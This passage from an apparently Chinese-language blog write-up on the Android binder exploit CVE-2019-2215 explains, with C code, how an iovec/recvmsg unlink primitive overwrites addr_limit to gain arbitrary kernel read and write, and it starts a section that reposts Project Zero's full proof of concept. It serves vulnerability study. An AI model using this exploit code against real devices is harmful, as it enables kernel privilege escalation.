+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;pid_t fork_ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fork();
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fork_ret &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fork&amp;#34;&lt;/span&gt;);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fork_ret &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
+        &lt;span style=&#34;color:#75715e&#34;&gt;/* Child process */&lt;/span&gt;
+        prctl(PR_SET_PDEATHSIG, SIGKILL);
+        sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
+        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CHILD: Doing EPOLL_CTL_DEL.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;event);
+        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CHILD: Finished EPOLL_CTL_DEL.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+        &lt;span style=&#34;color:#75715e&#34;&gt;// write second_chunk
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (write(socks[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], second_write_chunk, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(second_write_chunk)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(second_write_chunk))
+                err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;write second chunk to socket&amp;#34;&lt;/span&gt;);
+        exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+}
+ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;msghdr&lt;/span&gt; msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+.msg_iov &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; iovec_array,
+.msg_iovlen &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; IOVEC_ARRAY_SZ
+};
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; recvmsg_result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; recvmsg(socks[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;msg, MSG_WAITALL);
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/overwrite_addr_limit.jpg&#34; alt=&#34;overwrite addr_limit&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里借用P0 blog里的图。左边是unlink后的内存布局。
+首先依然是利用unlink去改写&lt;code&gt;iovec[10].iov_len&lt;/code&gt;和&lt;code&gt;iovec[11].iov_base&lt;/code&gt;，使其指向&lt;code&gt;iovec[10].iov_len&lt;/code&gt;。
+而后就是本次攻击的重点，右边部分，该布局是&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (write(socks[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], second_write_chunk, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(second_write_chunk)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(second_write_chunk))
+        err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;write second chunk to socket&amp;#34;&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;写入&lt;code&gt;second_write_chunk&lt;/code&gt;后的效果。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; second_write_chunk[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+        &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;/* iov_len */&lt;/span&gt; (already used) &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*/&lt;/span&gt;
+        &lt;span style=&#34;color:#ae81ff&#34;&gt;0xdeadbeef&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;/* iov_base (already used) */&lt;/span&gt;
+        &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;/* iov_len (already used) */&lt;/span&gt;
+        current_ptr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;/* next iov_base (addr_limit) */&lt;/span&gt;
+        &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;/* next iov_len (sizeof(addr_limit)) */&lt;/span&gt;
+        &lt;span style=&#34;color:#ae81ff&#34;&gt;0xfffffffffffffffe&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;/* value to write - new addr_limit */&lt;/span&gt;
+};
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;首先，此时&lt;code&gt;write&lt;/code&gt;会从&lt;code&gt;iovec[11].iov_base&lt;/code&gt;指向的内存开始写入数据，并且写入数据的size为&lt;strong&gt;0x28&lt;/strong&gt; Bytes。而此时&lt;code&gt;iovec[11].iov_base&lt;/code&gt;指向&lt;code&gt;iovec[10].iov_len&lt;/code&gt;所在内存，即偏移为&lt;code&gt;binder_thread + 0xa8&lt;/code&gt;处。从而将从&lt;code&gt;0xa8&lt;/code&gt;偏移处，依次写入&lt;code&gt;second_write_chunk&lt;/code&gt;中的数据。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;iovec[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+iovec[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;].iov_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xdeadbeef&lt;/span&gt;;
+iovec[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;;
+iovec[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;].iov_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; current_ptr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;;
+iovec[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;以上刚好是0x28 Bytes的数据，而&lt;code&gt;current_ptr&lt;/code&gt;正是我们已经通过第一次leak &lt;code&gt;tast_struct&lt;/code&gt; 得到的地址，所以此时的&lt;code&gt;iovec[12].iov_base&lt;/code&gt;就指向了&lt;code&gt;addr_limit&lt;/code&gt;所在的内存。同时&lt;code&gt;iovec[11].iob_base&lt;/code&gt;指向的内存(从&lt;code&gt;iovec[10].iov_len&lt;/code&gt;开始的0x28 Bytes)已经写完。所以此时&lt;code&gt;write&lt;/code&gt;会将接下来的数据写入&lt;code&gt;iovec[12].iov_base&lt;/code&gt;指向的内存(也即存储&lt;code&gt;addr_limit&lt;/code&gt;的内存)，即&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// current_ptr + 0x8 points to task_stuct.thread_info.addr_limit
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(current_ptr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xfffffffffffffffe&lt;/span&gt;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;到这里，就成功篡改了&lt;code&gt;addr_limit&lt;/code&gt;的限制，后面即可读写kernel任意内存。&lt;/p&gt;
+&lt;h3 id=&#34;25-full-poc&#34;&gt;2.5 Full Poc&lt;/h3&gt;
+&lt;p&gt;这里把 P0提供的完整&lt;a href=&#34;https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885&#34;&gt;poc&lt;/a&gt;贴在这里，方便查阅。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;  1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;  2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;  3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;  4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;  5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;  6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;  7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;  8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;  9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 13
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 14
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 15
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 16
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 17
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 18
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 19
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 20
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 21
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 22
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 23
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 24
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 25
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 26
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 27
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 28
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 29
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 30
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 31
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 32
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 33
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 34
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 35
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 36
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 37
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 38
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 39
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 40
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 41
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 42
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 43
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 44
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 45
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 46
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 47
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 48
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 49
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 50
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 51
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 52
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 53
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 54
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 55
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 56
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 57
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 58
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 59
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 60
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 61
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 62
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 63
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 64
